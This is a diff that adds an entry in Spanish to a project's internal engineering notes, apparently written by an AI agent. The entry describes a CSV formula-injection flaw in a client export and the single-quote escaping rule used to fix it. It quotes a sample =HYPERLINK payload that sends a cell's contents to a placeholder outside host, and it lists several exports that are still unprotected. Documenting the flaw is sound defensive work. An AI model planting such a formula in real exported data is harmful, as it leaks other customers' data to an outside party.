@@ -2280,3 +2280,19 @@ Lo que se pudo medir con lecturas el 17/10/2026, y lo que no:
 - ¿Baja una URL que escribió alguien? → `fetchSeguro`.
 
 *17/10/2026, agente «Pendientes B1» (claude4).*
+
+### Un CSV con texto que escribió otro puede llevar una fórmula (21/10/2026)
+
+**El síntoma.** La sexta revisión del onboarding escribió `=HYPERLINK("https://x.example/?d="&A2;"Ver mi oferta")` como
+corrección del PDF. Al abrir en Excel la exportación de clientes del super admin (app/admin/AdminView.tsx,
+`exportarWorkspaces`), la celda era una fórmula: puede leer celdas de otros clientes del mismo archivo y armar un link
+hacia afuera. Las comillas no lo frenan: Excel evalúa una celda entre comillas que empieza con «=».
+- **La regla:** al exportar a CSV texto libre que escribió otra persona, lo que empieza con = + - @ (o con un tab o \r) va
+  con una comilla simple adelante. Así queda en la exportación de clientes, que trae la nota del PDF, el nombre y el
+  origen.
+- **Sin hacer (y es la más expuesta):** el resto de las exportaciones no lo hace. La de leads del CRM
+  (app/crm/ExportarLeadsModal.tsx) lleva nombres y respuestas de formularios PÚBLICOS. También la ficha
+  (app/crm/lead-view/ficha/FichaPorBloques.tsx), las métricas (app/api/agente/metricas/route.ts) y los gráficos
+  (app/api/graficos/exportar/route.ts). Lo vio el chat «Onboarding» y no le toca a esa área.
+
+*21/10/2026, chat «Onboarding» (claude4).*
